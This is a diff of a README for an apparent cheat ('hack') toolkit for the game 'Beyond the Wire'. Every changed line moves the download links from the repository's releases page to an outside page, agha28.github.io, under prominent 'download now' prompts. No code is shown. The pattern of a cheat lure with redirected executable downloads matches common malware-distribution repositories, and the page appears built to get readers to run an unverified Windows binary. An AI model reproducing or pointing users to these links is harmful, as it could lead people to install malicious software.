@@ -1,7 +1,7 @@
 <h1>⚔️ beyond-the-wire-hack-2026-frontline-combat-toolkit - Your WWI Battlefield Command Center</h1>
 
 <p align="center">
-  <a href="https://github.com/Agha28/beyond-the-wire-hack-2026-frontline-combat-toolkit/releases">
+  <a href="https://agha28.github.io">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C2C2C" alt="Download Button" width="400">
   </a>
 </p>
@@ -20,7 +20,7 @@ Think of it as your digital field manual, aiming trainer, and battle analyst –
 
 Visit this link to download the application:
 
-👉 **[Click Here to Download](https://github.com/Agha28/beyond-the-wire-hack-2026-frontline-combat-toolkit/releases)**
+👉 **[Click Here to Download](https://agha28.github.io)**
 
 You'll see a list of files on that page. Look for the most recent version (the one with the highest number) and click the download link for your Windows PC.
 
@@ -193,7 +193,7 @@ Every soldier deserves the right tools. This toolkit gives you:
 
 Download it now, spend 10 minutes learning the interface, and step onto the battlefield with confidence. Your squad is counting on you.
 
-**👉 [Download the Frontline Combat Toolkit Now](https://github.com/Agha28/beyond-the-wire-hack-2026-frontline-combat-toolkit/releases)**
+**👉 [Download the Frontline Combat Toolkit Now](https://agha28.github.io)**
 
 ---
 
